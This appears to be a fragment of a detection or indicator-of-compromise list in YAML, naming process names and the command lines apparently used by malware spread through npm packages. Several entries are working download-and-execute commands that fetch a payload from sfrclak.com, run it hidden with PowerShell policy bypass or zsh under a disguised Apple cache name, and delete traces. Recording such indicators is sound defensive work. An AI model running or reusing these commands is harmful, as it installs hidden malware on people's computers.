  - powershell.exe
  - cmd.exe
  - curl
  - node
  - bash
  - zsh
  command_lines:
  - cmd.exe /c curl -s -X POST -d packages.npm.org/product1 http://sfrclak[.]com:8000/6202033
    > %TEMP%\6202033.ps1& %PROGRAMDATA%\wt.exe -w hidden -ep bypass -file %TEMP%\6202033.ps1
    http://sfrclak[.]com:8000/6202033 & del "PS_PATH" /f
  - curl -o /Library/Caches/com.apple.act.mond -d packages.npm.org/product0 -s http://sfrclak[.]com:8000/6202033
    && chmod 770 /Library/Caches/com.apple.act.mond && /bin/zsh -c "/Library/Caches/com.apple.act.mond
    http://sfrclak[.]com:8000/6202033 &" &> /dev/null
  - rm -rf tmp/6202033
  - node setup.js
  - curl -o /Library/Caches/com.apple.act.mond -d packages.npm.org/product0 -s http://sfrclak.com:8000/6202033
    && chmod 770 /Library/Caches/com.apple.act.mond && /bin/zsh -c "/Library/Caches/com.apple.act.mond
